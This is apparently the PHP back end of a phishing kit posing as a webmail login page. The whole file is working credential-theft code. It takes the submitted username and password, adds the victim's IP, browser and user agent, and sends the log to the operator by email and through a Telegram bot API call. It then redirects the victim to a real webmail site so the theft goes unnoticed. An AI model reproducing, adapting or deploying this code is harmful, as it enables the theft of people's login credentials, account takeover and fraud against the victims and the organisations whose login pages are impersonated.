<?php

session_start();
$errors = array(); 
$id = session_id();


if(isset($_POST['username'])&&(isset($_POST['password'])))

              

{
       
       
       include '../settings/settings.php';
      
               
              $username     = $_POST['username'];
			  $password     = $_POST['password'];
			 
              $ip = getenv("REMOTE_ADDR");
              $useragent = $_SERVER['HTTP_USER_AGENT'];

              $owner = $settings['email'];
  
    



# Logs 

              $message  = "|==[Webmail Login]==|\n";
			  $message .= "| Ident: {$id}\n";
              $message .= "| Username: {$username}\n";
			  $message .= "| Password: {$password}\n";
              $message .= "| 🌍 -- I P |I N F O -- 🌍\n";
              $message .= "| IP Address:{$_SESSION['ip']}\r\n";
              $message .= "| Browser:{$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
              $message .= "| User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
              $message .= "| TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
              $message .= "|= @g0ne_in_60_seconds =|\n";
             


  # Settings


$settings = include '../settings/settings.php';
$owner = $settings['email'];
$filename = "../Logs/results.txt";


# Send Mail
                if ($settings['send_mail'] == "1")
                {
                $to = $owner;
                $headers = "Content-type:text/plain;charset=UTF-8\r\n";
                $headers .= "From:Webmail <ppCC-$randomnumber@60seconds.team>";
                $subject = "L O G I N ✦ D E T A I L S ✦ W E L L S => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ] ";
                $msg = $message;
                mail($to, $subject, $msg, $headers);
                }



    
# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  




 if($settings['double_login'] == "1"){
  echo "<script>window.location.href = \"https://webmail.unitedyacht.com\"; </script>";
} else {
  echo "<script>window.location.href = \"https://webmail.unitedyacht.com\"; </script>";

}
}

}

?>